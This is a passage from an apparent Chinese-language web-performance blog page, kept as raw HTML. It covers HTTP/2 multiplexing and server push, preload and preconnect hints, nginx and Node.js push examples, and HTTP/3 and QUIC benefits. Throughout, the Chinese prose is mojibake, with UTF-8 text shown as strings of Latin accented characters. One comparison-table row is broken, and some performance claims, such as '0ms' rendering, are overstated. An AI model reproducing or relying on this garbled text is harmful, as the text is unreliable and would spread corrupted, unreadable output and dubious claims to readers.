align="left">å‡å°‘è¯·æ±‚å¤´ä½“ç§¯ï¼ˆCookie&#x2F;User-Agentç­‰ï¼‰</td></tr><tr><td align="left">æœåŠ¡å™¨æ¨é€</td><td align="left">ä¸»åŠ¨æ¨é€å…³é”®èµ„æºï¼ˆæ— éœ€ç­‰å¾…HTMLè§£æï¼‰</td></tr><tr><td align="left">æµä¼˜å…ˆçº§</td><td align="left">ä¼˜å…ˆä¼ è¾“CSS&#x2F;JSï¼ˆä¿éšœæ¸²æŸ“é€Ÿåº¦ï¼‰</td></tr></tbody></table><p>å®Œæ•´å·¥ä½œæµï¼š</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Client->>Server: å‘èµ·HTTPSè¿æ¥ï¼ˆTLSæ¡æ‰‹ï¼‰    Server->>Client: è¿”å›HTTP/2åè®®æ”¯æŒ    Client->>Server: å‘é€HEADERSå¸§ï¼ˆå«HPACKå‹ç¼©å¤´ï¼‰    Server->>Client: æ¨é€å…³é”®CSSï¼ˆPUSH_PROMISEå¸§ï¼‰    Server->>Client: å¹¶è¡Œä¼ è¾“HTML+CSS+JSï¼ˆå¤šDATAå¸§ï¼‰    Client->>Browser: æµä¼˜å…ˆçº§æ’åº -> å¿«é€Ÿæ¸²æŸ“</pre><p><strong>å®æˆ˜ä¼˜åŒ–ç­–ç•¥</strong></p><p>(1) å‹ç¼©ç­–ç•¥ç»„åˆ</p><ul><li>é™æ€èµ„æºï¼šé¢„å‹ç¼©Brotliï¼ˆ.bråç¼€ï¼‰ + å¤‡ç”¨Gzip</li><li>åŠ¨æ€å†…å®¹ï¼šå®æ—¶Gzipå‹ç¼©ï¼ˆCPUæ¶ˆè€—ä½ï¼‰</li></ul><p>(2) HTTP&#x2F;2 æœ€ä½³å®è·µ</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># å¼ºåˆ¶å¯ç”¨HTTP/2</span><br><span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl http2; <br><br><span class="hljs-comment"># å¯ç”¨æœåŠ¡å™¨æ¨é€ï¼ˆéœ€è°¨æ…ï¼‰</span><br><span class="hljs-attribute">http2_push</span> /style.css; <br><span class="hljs-attribute">http2_push</span> /app.js;<br></code></pre></td></tr></table></figure><p>(3) èµ„æºåŠ è½½ä¼˜åŒ–</p><ul><li>å‡å°‘åŸŸååˆ†ç‰‡ï¼ˆHTTP&#x2F;2ä¸‹å•åŸŸåæ›´é«˜æ•ˆï¼‰</li><li>å›¾ç‰‡æ‡’åŠ è½½ + å¼‚æ­¥åŠ è½½éå…³é”®JS</li></ul><h3 id="é¢„åŠ è½½ï¼ˆpreloadï¼‰ä¸é¢„è¿æ¥ï¼ˆpreconnectï¼‰"><a href="#é¢„åŠ è½½ï¼ˆpreloadï¼‰ä¸é¢„è¿æ¥ï¼ˆpreconnectï¼‰" class="headerlink" title="é¢„åŠ è½½ï¼ˆpreloadï¼‰ä¸é¢„è¿æ¥ï¼ˆpreconnectï¼‰"></a>é¢„åŠ è½½ï¼ˆpreloadï¼‰ä¸é¢„è¿æ¥ï¼ˆpreconnectï¼‰</h3><p><strong>é¢„åŠ è½½ï¼ˆpreloadï¼‰</strong></p><p>æ ¸å¿ƒä½œç”¨ï¼šå¼ºåˆ¶æå‰åŠ è½½å…³é”®æ¸²æŸ“èµ„æºï¼Œçªç ´æµè§ˆå™¨é»˜è®¤ä¼˜å…ˆçº§é™åˆ¶ï¼ŒåŠ é€Ÿå…³é”®è·¯å¾„æ¸²æŸ“ã€‚</p><pre class="mermaid">graph LR  A[HTMLè§£æ] --> B{å‘ç° preload æ ‡ç­¾}  B -->|ç«‹å³è¯·æ±‚| C[å…³é”®èµ„æº]  C --> D[æå‰åŠ è½½å®Œæˆ]  D --> E[é¡µé¢æ¸²æŸ“ç›´æ¥ä½¿ç”¨]</pre><p>å®ç°æ–¹å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- åŸºæœ¬ç”¨æ³• --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;font.woff2&quot; as=&quot;font&quot; type=&quot;font/woff2&quot; crossorigin&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;critical.css&quot; as=&quot;style&quot;&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;main.js&quot; as=&quot;script&quot;&gt;<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">&lt;!-- HTTPå“åº”å¤´æ–¹å¼ï¼ˆä¼˜å…ˆçº§æ›´é«˜ï¼‰ --&gt;<br><span class="hljs-attribute">Link</span><span class="hljs-punctuation">: </span>&lt;/critical.css&gt;; rel=preload; as=style<br></code></pre></td></tr></table></figure><p>å…³é”®ç‰¹æ€§ï¼š</p><table><thead><tr><th align="left">å±æ€§</th><th align="left">ä½œç”¨</th><th align="left">å¿…å¡«é¡¹</th></tr></thead><tbody><tr><td align="left">href</td><td align="left">èµ„æºè·¯å¾„</td><td align="left">âœ”ï¸</td></tr><tr><td align="left">as</td><td align="left">èµ„æºç±»å‹ï¼ˆfont&#x2F;script&#x2F;styleï¼‰</td><td align="left">âœ”ï¸</td></tr><tr><td align="left">type</td><td align="left">MIMEç±»å‹ï¼ˆå¦‚font&#x2F;woff2ï¼‰</td><td align="left">æ¨è</td></tr><tr><td align="left">crossorigin</td><td align="left">è·¨åŸŸèµ„æºå¿…é¡»</td><td align="left">æ¡ä»¶</td></tr><tr><td align="left">fetchpriority</td><td align="left">ä¼˜å…ˆçº§æ§åˆ¶ï¼ˆhigh&#x2F;lowï¼‰</td><td align="left">Chrome</td></tr></tbody></table><p>é€‚ç”¨åœºæ™¯ï¼š</p><ul><li>é¦–å±å…³é”®CSSï¼šé¿å…æ¸²æŸ“é˜»å¡</li><li>è‡ªå®šä¹‰å­—ä½“ï¼šæ¶ˆé™¤FOITï¼ˆå­—ä½“æœªåŠ è½½æ—¶çš„ç©ºç™½ï¼‰</li><li>é¦–å±å›¾ç‰‡ï¼šLCPï¼ˆæœ€å¤§å†…å®¹ç»˜åˆ¶ï¼‰ä¼˜åŒ–</li><li>æ ¸å¿ƒæ¡†æ¶JSï¼šæå‰è§£æç¼–è¯‘</li></ul><p><strong>é¢„è¿æ¥ï¼ˆpreconnectï¼‰</strong></p><p>æ ¸å¿ƒä½œç”¨ï¼šæå‰å®Œæˆè·¨åŸŸè¿æ¥çš„æ¡æ‰‹é˜¶æ®µï¼ŒèŠ‚çœDNS+TCP+TLSæ—¶é—´ï¼ˆçº¦100-500msï¼‰ã€‚</p><pre class="mermaid">sequenceDiagram    participant Browser    participant CDN as ç¬¬ä¸‰æ–¹æœåŠ¡å™¨    Browser->>Browser: è§£æHTMLå‘ç°preconnect    Browser->>CDN: 1. DNSè§£æ    Browser->>CDN: 2. TCPæ¡æ‰‹    Browser->>CDN: 3. TLSåå•†    Note over Browser,CDN: è¿æ¥å°±ç»ªï¼ˆèŠ‚çœ3æ¬¡RTTï¼‰    Browser->>CDN: å®é™…èµ„æºè¯·æ±‚ï¼ˆç«‹å³å‘é€ï¼‰</pre><p>å®ç°æ–¹å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- é¢„è¿æ¥ç¬¬ä¸‰æ–¹æº --&gt;<br>&lt;link rel=&quot;preconnect&quot; href=&quot;https://cdn.example.com&quot;&gt;<br>&lt;link rel=&quot;preconnect&quot; href=&quot;https://api.example.com&quot; crossorigin&gt;<br><br>&lt;!-- DNSé¢„å–ï¼ˆæ›´è½»é‡ï¼‰ --&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//cdn.example.com&quot;&gt;<br></code></pre></td></tr></table></figure><p>å…³é”®å±æ€§ï¼š</p><table><thead><tr><th align="left">å±æ€§</th><th align="left">ä½œç”¨</th></tr></thead><tbody><tr><td align="left">href</td><td align="left">ç›®æ ‡åŸŸåï¼ˆæ— è·¯å¾„ï¼‰</td></tr><tr><td align="left">crossorigin</td><td align="left">éœ€å‡­è¯çš„èµ„æºå¿…é¡»è®¾ç½®</td></tr></tbody></table><p>é€‚ç”¨åœºæ™¯ï¼š</p><ul><li>CDNèµ„æºåŸŸï¼šé™æ€èµ„æºåŠ è½½</li><li>APIæ¥å£åŸŸï¼šAJAXè¯·æ±‚ä¼˜åŒ–</li><li>åˆ†æç»Ÿè®¡åŸŸï¼šGoogle Analyticsç­‰</li><li>ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼šç¤¾äº¤åª’ä½“æ’ä»¶</li></ul><p><strong>å¯¹æ¯”å†³ç­–æŒ‡å—</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">preload</th><th align="left">preconnect</th></tr></thead><tbody><tr><td align="left">ä¼˜åŒ–ç›®æ ‡</td><td align="left">èµ„æºæœ¬èº«</td><td align="left">ç½‘ç»œè¿æ¥</td></tr><tr><td align="left">ç½‘ç»œæ¶ˆè€—</td><td align="left">é«˜ï¼ˆä¼ è¾“èµ„æºå†…å®¹ï¼‰</td><td align="left">ä½ï¼ˆä»…æ¡æ‰‹ï¼‰</td></tr><tr><td align="left">æ‰§è¡Œæ—¶æœº</td><td align="left">ç«‹å³ä¸‹è½½èµ„æº</td><td align="left">å»ºç«‹è¿æ¥æ± å¤‡ç”¨</td></tr><tr><td align="left">æœ€ä½³é€‚ç”¨</td><td align="left">å·²çŸ¥URLçš„å…³é”®æ¸²æŸ“èµ„æº</td><td align="left">æœªçŸ¥URLçš„ç¬¬ä¸‰æ–¹åŸŸ</td></tr><tr><td align="left">ä¼˜å…ˆçº§</td><td align="left">éå¸¸é«˜ï¼ˆå¼ºåˆ¶åŠ è½½ï¼‰</td><td align="left">é«˜</td></tr><tr><td align="left">æµè§ˆå™¨æ”¯æŒ</td><td align="left">Chrome&gt;58, Firefox&gt;56, Safari&gt;11</td><td align="left">Chrome&gt;46, Firefox&gt;39, Safari&gt;11</td></tr></tbody></table><h2 id="4-3-åè®®å‡çº§"><a href="#4-3-åè®®å‡çº§" class="headerlink" title="4.3 åè®®å‡çº§"></a>4.3 åè®®å‡çº§</h2><h3 id="HTTP-2æœåŠ¡ç«¯æ¨é€ï¼ˆServer-Pushï¼‰"><a href="#HTTP-2æœåŠ¡ç«¯æ¨é€ï¼ˆServer-Pushï¼‰" class="headerlink" title="HTTP&#x2F;2æœåŠ¡ç«¯æ¨é€ï¼ˆServer Pushï¼‰"></a>HTTP&#x2F;2æœåŠ¡ç«¯æ¨é€ï¼ˆServer Pushï¼‰</h3><p><strong>æ ¸å¿ƒåŸç†</strong></p><p>æœåŠ¡ç«¯åœ¨å“åº”ä¸»èµ„æºè¯·æ±‚æ—¶ï¼Œä¸»åŠ¨æ¨é€å…³è”å­èµ„æºåˆ°æµè§ˆå™¨ç¼“å­˜ï¼Œæ¶ˆé™¤ä¼ ç»Ÿâ€è¯·æ±‚-å“åº”â€é“¾çš„ä¸²è¡Œå»¶è¿Ÿã€‚</p><pre class="mermaid">sequenceDiagram    participant Client as å®¢æˆ·ç«¯    participant Server as æœåŠ¡å™¨    Client->>Server: è¯·æ±‚HTMLæ–‡æ¡£ (GET /index.html)    Server->>Server: è§£æHTMLä¾èµ– (CSS/JS/å›¾ç‰‡)    Server->>Client: å“åº”HTML + PUSH_PROMISEå¸§ (æ‰¿è¯ºæ¨é€/css/style.css)    Server->>Client: æ¨é€CSSæ–‡ä»¶ (DATAå¸§)    Server->>Client: æ¨é€JSæ–‡ä»¶ (PUSH_PROMISE + DATA)    Client->>Client: ä»ç¼“å­˜ç›´æ¥åŠ è½½æ¨é€èµ„æº    Note over Client: æ¸²æŸ“æ— éœ€ç­‰å¾…åç»­è¯·æ±‚</pre><p><strong>ä¸ä¼ ç»ŸåŠ è½½å¯¹æ¯”</strong></p><table><thead><tr><th align="left">é˜¶æ®µ</th><th align="left">HTTP&#x2F;1.1</th><th align="left">HTTP&#x2F;2 + Server Push</th></tr></thead><tbody><tr><td align="left">é¦–æ¬¡è¯·æ±‚</td><td align="left">è·å–HTML</td><td align="left">è·å–HTML</td></tr><tr><td align="left">å‘ç°å­èµ„æº</td><td align="left">è§£æHTML â†’ å‘èµ·CSS&#x2F;JSè¯·æ±‚</td><td align="left">æ— éœ€è¯·æ±‚ï¼ˆå·²æ¨é€è‡³ç¼“å­˜ï¼‰</td></tr><tr><td align="left">èµ„æºä¼ è¾“</td><td align="left">é¡ºåºç­‰å¾…ï¼ˆé˜Ÿå¤´é˜»å¡ï¼‰</td><td align="left">å¹¶è¡Œä¼ è¾“</td></tr><tr><td align="left">æ¸²æŸ“å¼€å§‹</td><td align="left">300-500ms</td><td align="left">0msï¼ˆCSSå·²å°±ç»ªï¼‰</td></tr></tbody></table><p><strong>æŠ€æœ¯å®ç°è¯¦è§£</strong></p><p>(1) æ¨é€è§¦å‘æ¡ä»¶</p><ul><li>æ˜¾å¼é…ç½®ï¼ˆå¼€å‘è€…æŒ‡å®šï¼‰</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginxé…ç½®</span><br><span class="hljs-attribute">http2_push</span> /static/style.css;<br><span class="hljs-attribute">http2_push_preload</span> <span class="hljs-literal">on</span>;  <span class="hljs-comment"># è§£æLinkå¤´éƒ¨</span><br></code></pre></td></tr></table></figure><ul><li>éšå¼è§¦å‘ï¼ˆéœ€å¯ç”¨<code>http2_push_preload</code>ï¼‰</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"># å“åº”å¤´å£°æ˜éœ€æ¨é€èµ„æº<br><span class="hljs-attribute">Link</span><span class="hljs-punctuation">: </span>&lt;/static/script.js&gt;; rel=preload; as=script<br></code></pre></td></tr></table></figure><p>(2) æ¨é€åè®®æµç¨‹</p><ul><li>å‘é€ PUSH_PROMISEå¸§<ul><li>åŒ…å«æ¬²æ¨é€èµ„æºçš„è¯·æ±‚å¤´ï¼ˆ:path&#x2F;:authorityï¼‰</li><li>æ‰¿è¯ºçš„ æµID ä¸ºå¶æ•°ï¼ˆåŒºåˆ†å®¢æˆ·ç«¯è¯·æ±‚çš„å¥‡æ•°æµï¼‰</li></ul></li><li>æ¨é€ HEADERS+DATAå¸§<ul><li>åœ¨åŸå§‹å“åº”æµå®Œæˆå‰å‘é€æ¨é€èµ„æº</li></ul></li><li>å®¢æˆ·ç«¯ ç¼“å­˜ç®¡ç†<ul><li>æµè§ˆå™¨éªŒè¯ç¼“å­˜æœ‰æ•ˆæ€§ï¼ˆç±»ä¼¼å¸¸è§„è¯·æ±‚ï¼‰</li></ul></li></ul><p>(3) å®¢æˆ·ç«¯æ§åˆ¶æœºåˆ¶</p><ul><li>æ¥å—æ¨é€ï¼šé»˜è®¤è‡ªåŠ¨ç¼“å­˜ï¼ˆé™¤éç¼“å­˜å¤´ç¦æ­¢ï¼‰</li><li>æ‹’ç»æ¨é€ï¼šå‘é€ RST_STREAMå¸§ï¼ˆåœºæ™¯ï¼šèµ„æºå·²ç¼“å­˜ï¼‰</li></ul><pre class="mermaid">sequenceDiagram    Server->>Client: PUSH_PROMISE (æµID:2)    alt å®¢æˆ·ç«¯éœ€è¦è¯¥èµ„æº        Client-->>Server: æ— æ“ä½œï¼ˆæ¥å—æ¨é€ï¼‰    else èµ„æºå·²ç¼“å­˜        Client->>Server: RST_STREAM (æµID:2)    end</pre><p><strong>æ€§èƒ½ä¼˜åŒ–åœºæ™¯</strong></p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">ä¼ ç»Ÿæ–¹å¼é—®é¢˜</th><th align="left">Server Pushè§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">å…³é”®CSSé˜»å¡æ¸²æŸ“</td><td align="left">éœ€å¾€è¿”è¯·æ±‚ â†’ å»¶è¿Ÿæ¸²æŸ“</td><td align="left">æ¨é€CSS â†’ å®ç°â€0-RTTæ¸²æŸ“â€</td></tr><tr><td align="left">å­—ä½“åŠ è½½ç©ºç™½(FOIT)</td><td align="left">æ–‡å­—å»¶è¿Ÿæ˜¾ç¤º</td><td align="left">æ¨é€å­—ä½“æ–‡ä»¶ â†’ æ¶ˆé™¤å¸ƒå±€åç§»</td></tr><tr><td align="left">é¦–å±å›¾ç‰‡(LCP)</td><td align="left">å›¾ç‰‡è¯·æ±‚é å â†’ LCPå»¶è¿Ÿ</td><td align="left">æ¨é€è‹±é›„å›¾ â†’ åŠ é€ŸLCP</td></tr></tbody></table><p><strong>é…ç½®æœ€ä½³å®è·µï¼šNode.js å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> http2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http2&#x27;</span>);<br><span class="hljs-keyword">const</span> server = http2.<span class="hljs-title function_">createSecureServer</span>(&#123; cert, key &#125;);<br><br>server.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;stream&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">stream, headers</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (headers[<span class="hljs-string">&#x27;:path&#x27;</span>] === <span class="hljs-string">&#x27;/index.html&#x27;</span>) &#123;<br>    <span class="hljs-comment">// æ¨é€CSS</span><br>    stream.<span class="hljs-title function_">pushStream</span>(&#123; <span class="hljs-string">&#x27;:path&#x27;</span>: <span class="hljs-string">&#x27;/style.css&#x27;</span> &#125;, <span class="hljs-function">(<span class="hljs-params">pushStream</span>) =&gt;</span> &#123;<br>      pushStream.<span class="hljs-title function_">respondWithFile</span>(<span class="hljs-string">&#x27;style.css&#x27;</span>, &#123;<br>        <span class="hljs-string">&#x27;content-type&#x27;</span>: <span class="hljs-string">&#x27;text/css&#x27;</span><br>      &#125;);<br>    &#125;);<br>    <br>    <span class="hljs-comment">// å“åº”HTML</span><br>    stream.<span class="hljs-title function_">respondWithFile</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>, &#123;<br>      <span class="hljs-string">&#x27;content-type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span><br>    &#125;);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>é»„é‡‘æ³•åˆ™</strong></p><ul><li>ä»…æ¨é€å…³é”®æ¸²æŸ“èµ„æº<ul><li>é¦–å±CSS</li><li>é˜»å¡æ¸²æŸ“JS</li><li>LCPå›¾ç‰‡</li></ul></li><li>ä½“ç§¯æ§åˆ¶<ul><li>å•é¡µæ¨é€èµ„æºâ‰¤30KB</li><li>æ€»æ¨é€é‡â‰¤100KBï¼ˆé¿å…é˜Ÿå¤´é˜»å¡ï¼‰</li></ul></li><li>ç¼“å­˜æ„ŸçŸ¥<ul><li>ç»“åˆ Cache-Digest è‰æ¡ˆï¼ˆæš‚æœªæ™®åŠï¼‰</li><li>çŸ­TTLèµ„æºé¿å…æ¨é€ï¼ˆå¦‚ä¸ªæ€§åŒ–å†…å®¹ï¼‰</li></ul></li></ul><p><strong>æµè§ˆå™¨æ”¯æŒä¸é™åˆ¶</strong></p><table><thead><tr><th align="left">æµè§ˆå™¨</th><th align="left">æ”¯æŒç‰ˆæœ¬</th><th align="left">ç‰¹æ®Šé™åˆ¶</th></tr></thead><tbody><tr><td align="left">Chrome</td><td align="left">49+</td><td align="left">éœ€HTTPS</td></tr><tr><td align="left">Firefox</td><td align="left">44+</td><td align="left">å…è®¸HTTPæ¨é€ï¼ˆéæ ‡å‡†ï¼‰</td></tr><tr><td align="left">Safari</td><td align="left">ä¸æ”¯æŒ</td><td align="left">æŠ€æœ¯è·¯çº¿è½¬å‘103 Early Hints</td></tr><tr><td align="left">Edge</td><td align="left">12+</td><td align="left">åŒChromium</td></tr></tbody></table><h3 id="HTTP-3çš„QUICåè®®ä¼˜åŠ¿"><a href="#HTTP-3çš„QUICåè®®ä¼˜åŠ¿" class="headerlink" title="HTTP&#x2F;3çš„QUICåè®®ä¼˜åŠ¿"></a>HTTP&#x2F;3çš„QUICåè®®ä¼˜åŠ¿</h3><p><strong>QUICåè®®æ ¸å¿ƒä¼˜åŠ¿</strong></p><p>(1) è¿æ¥å»ºç«‹ä¼˜åŒ–ï¼ˆ0-1 RTTï¼‰</p><ul><li>é¦–æ¬¡è¿æ¥ï¼šQUICåˆå¹¶ä¼ è¾“å±‚ä¸åŠ å¯†å±‚æ¡æ‰‹ â†’ 1-RTTå®Œæˆè¿æ¥+TLSåå•†ï¼ˆå¯¹æ¯”TCP+TLSçš„2-3 RTTï¼‰</li><li>ä¼šè¯æ¢å¤ï¼šæ”¯æŒ0-RTTæ¡æ‰‹ï¼Œå®¢æˆ·ç«¯ç¼“å­˜å¯†é’¥åå¯ç›´æ¥å‘é€æ•°æ®ï¼ˆå¦‚é‡å¤è®¿é—®ç”¨æˆ·ç¬é—´åŠ è½½èµ„æºï¼‰</li></ul><pre class="mermaid">sequenceDiagram    å®¢æˆ·ç«¯->>æœåŠ¡å™¨: é¦–æ¬¡è¯·æ±‚ (1-RTT)    æœåŠ¡å™¨->>å®¢æˆ·ç«¯: è¿”å›åŠ å¯†å¯†é’¥ï¼ˆç¼“å­˜ï¼‰    å®¢æˆ·ç«¯->>æœåŠ¡å™¨: åç»­è¯·æ±‚ (0-RTT + åº”ç”¨æ•°æ®)</pre><p>(2) å½»åº•è§£å†³é˜Ÿå¤´é˜»å¡ï¼ˆHOL Blockingï¼‰</p><ul><li>HTTP&#x2F;2é—®é¢˜ï¼šåŸºäºTCPçš„å¤šè·¯å¤ç”¨ä¸­ï¼Œå•ä¸ªåŒ…ä¸¢å¤±ä¼šé˜»å¡æ‰€æœ‰æµ</li><li>QUICæ–¹æ¡ˆï¼šåœ¨UDPä¸Šå®ç°ç‹¬ç«‹æµæ§åˆ¶ï¼Œæ¯ä¸ªæµå•ç‹¬å¤„ç†ä¸¢åŒ…é‡ä¼  â†’ åŒ…ä¸¢å¤±ä»…å½±å“å½“å‰æµï¼Œå…¶ä»–æµæ­£å¸¸ä¼ è¾“</li></ul><p>(3) æ— ç¼è¿æ¥è¿ç§»</p><ul><li>ä¼ ç»ŸTCPé—®é¢˜ï¼šç½‘ç»œåˆ‡æ¢ï¼ˆå¦‚Wi-Fiâ†’4Gï¼‰å¯¼è‡´è¿æ¥ä¸­æ–­ â†’ éœ€é‡æ–°æ¡æ‰‹</li><li>QUICæ–¹æ¡ˆï¼šé€šè¿‡Connection IDæ ‡è¯†è¿æ¥ï¼ˆéIP&#x2F;ç«¯å£å››å…ƒç»„ï¼‰ â†’ ç½‘ç»œåˆ‡æ¢æ—¶è¿æ¥ä¿æŒæ´»è·ƒ</li></ul><p>(4) é»˜è®¤å¼ºåŠ å¯†ä¸å®‰å…¨æ€§</p><ul><li>å¼ºåˆ¶TLS 1.3ï¼šæ‰€æœ‰QUICæµé‡é»˜è®¤åŠ å¯†ï¼Œæ”¯æŒå‰å‘ä¿å¯†ï¼ˆPFSï¼‰ â†’ å³ä½¿å¯†é’¥æ³„éœ²ï¼Œå†å²æ•°æ®ä»å®‰å…¨</li><li>æŠ—é‡æ”¾æ”»å‡»ï¼šé€šè¿‡å•æ¬¡å¯†é’¥æ´¾ç”Ÿå€¼éªŒè¯ï¼Œæ‹’ç»é‡å¤è¯·æ±‚ </li><li>é˜²åè®®é™çº§ï¼šé›†æˆTLS 1.3çš„æŠ—é™çº§æœºåˆ¶ï¼Œé˜»æ­¢ä¸­é—´äººå¼ºåˆ¶ä½ç‰ˆæœ¬åŠ å¯†</li></ul><p>(5) æ‹¥å¡æ§åˆ¶ä¼˜åŒ–</p><ul><li>åŠ¨æ€ç®—æ³•ï¼šå†…ç½®BBRï¼ˆBottleneck Bandwidth and Round-tripï¼‰ç®—æ³• â†’ é«˜å»¶è¿Ÿç½‘ç»œä¸­ååé‡æå‡30%+</li><li>ç”¨æˆ·æ€å®ç°ï¼šåè®®æ ˆä½äºåº”ç”¨å±‚ï¼ˆéå†…æ ¸ï¼‰ï¼Œå¯å¿«é€Ÿè¿­ä»£æ‹¥å¡ç®—æ³•</li></ul><p>(6) å¤´éƒ¨å‹ç¼©ä¸ä¼ è¾“æ•ˆç‡</p><ul><li>QPACKå‹ç¼©ï¼šæ”¹è¿›HTTP&#x2F;2çš„HPACKï¼Œæ”¯æŒä¹±åºç¼–ç  â†’ å‡å°‘30%å¤´éƒ¨å¼€é”€ã€‚</li><li>å‰å‘çº é”™ï¼ˆFECï¼‰ï¼šæ·»åŠ å†—ä½™æ•°æ®åŒ…ï¼Œå°‘é‡ä¸¢åŒ…æ—¶æ— éœ€é‡ä¼  â†’ å¼±ç½‘ä¸‹è§†é¢‘å¡é¡¿ç‡é™ä½50%</li></ul><p><strong>QUIC vs TCP&#x2F;TLS å…³é”®å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">TCP&#x2F;TLSï¼ˆHTTP&#x2F;2ï¼‰</th><th align="left">QUICï¼ˆHTTP&#x2F;3ï¼‰</th><th align="left">å‰ç«¯å½±å“</th></tr></thead><tbody><tr><td align="left">è¿æ¥å»ºç«‹</td><td align="left">2-3 RTT</td><td align="left">0-1 RTT</td><td align="left">LCPæ—¶é—´â†“34%</td></tr><tr><td align="left">å¤šè·¯å¤ç”¨</td><td align="left">æµçº§é˜»å¡</td><td align="left">åŒ…çº§ç‹¬ç«‹</td><td align="left">FCPç¨³å®šæ€§â†‘</td></tr><tr><td align="left">ç½‘ç»œåˆ‡æ¢</td><td align="left">è¿æ¥ä¸­æ–­</td><td align="left">æ— ç¼è¿ç§»</td><td align="left">ç§»åŠ¨ç«¯è·³å‡ºç‡â†“</td></tr><tr><td align="left">åŠ å¯†æœºåˆ¶å¯é€‰TLSå¼ºåˆ¶TLS 1.3æ··åˆå†…å®¹é£é™©æ¶ˆé™¤</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">éƒ¨ç½²çµæ´»æ€§</td><td align="left">ä¾èµ–æ“ä½œç³»ç»Ÿå†…æ ¸</td><td align="left">ç”¨æˆ·æ€åè®®æ ˆ</td><td align="left">å¿«é€Ÿæ‹¥å¡ç®—æ³•æ›´æ–°</td></tr></tbody></table><p><strong>å‰ç«¯æ€§èƒ½ä¼˜åŒ–å®è·µ</strong></p><ul><li>ä¼˜å…ˆå…³é”®èµ„æºï¼š<ul><li>HTTP&#x2F;3ä¸‹æ— éœ€è¿‡åº¦åŸŸååˆ†ç‰‡ï¼ˆå•è¿æ¥å¤šæµç‹¬ç«‹ï¼‰ï¼Œé›†ä¸­CDNåŸŸåæå‡ç¼“å­˜å‘½ä¸­ç‡ã€‚</li></ul></li><li>0-RTTä¼šè¯åˆ©ç”¨ï¼š<ul><li>é™æ€èµ„æºè®¾ç½®é•¿ç¼“å­˜ (Cache-Control: immutable)ï¼ŒåŒ¹é…0-RTTå¿«é€ŸåŠ è½½ 4ã€‚</li></ul></li><li>ç›‘æ§åè®®å‡çº§ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æŸ¥çœ‹æµè§ˆå™¨Networké¢æ¿Protocolåˆ—</span><br>performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">&quot;resource&quot;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (res.<span class="hljs-property">nextHopProtocol</span> === <span class="hljs-string">&quot;h3&quot;</span>) <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;HTTP/3 used&quot;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>é™çº§å…¼å®¹æ–¹æ¡ˆï¼š<ul><li>æœåŠ¡å™¨åŒæ—¶ç›‘å¬HTTP&#x2F;2ä¸HTTP&#x2F;3ï¼ŒAlt-Svcå¤´è‡ªåŠ¨åå•†åè®®ï¼š</li></ul></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Alt-Svc</span><span class="hljs-punctuation">: </span>h3=&quot;:443&quot;; ma=2592000; v=&quot;46,43&quot;<br></code></pre></td></tr></table></figure><h1 id="äº”ã€é«˜çº§ç½‘ç»œæŠ€æœ¯"><a href="#äº”ã€é«˜çº§ç½‘ç»œæŠ€æœ¯" class="headerlink" 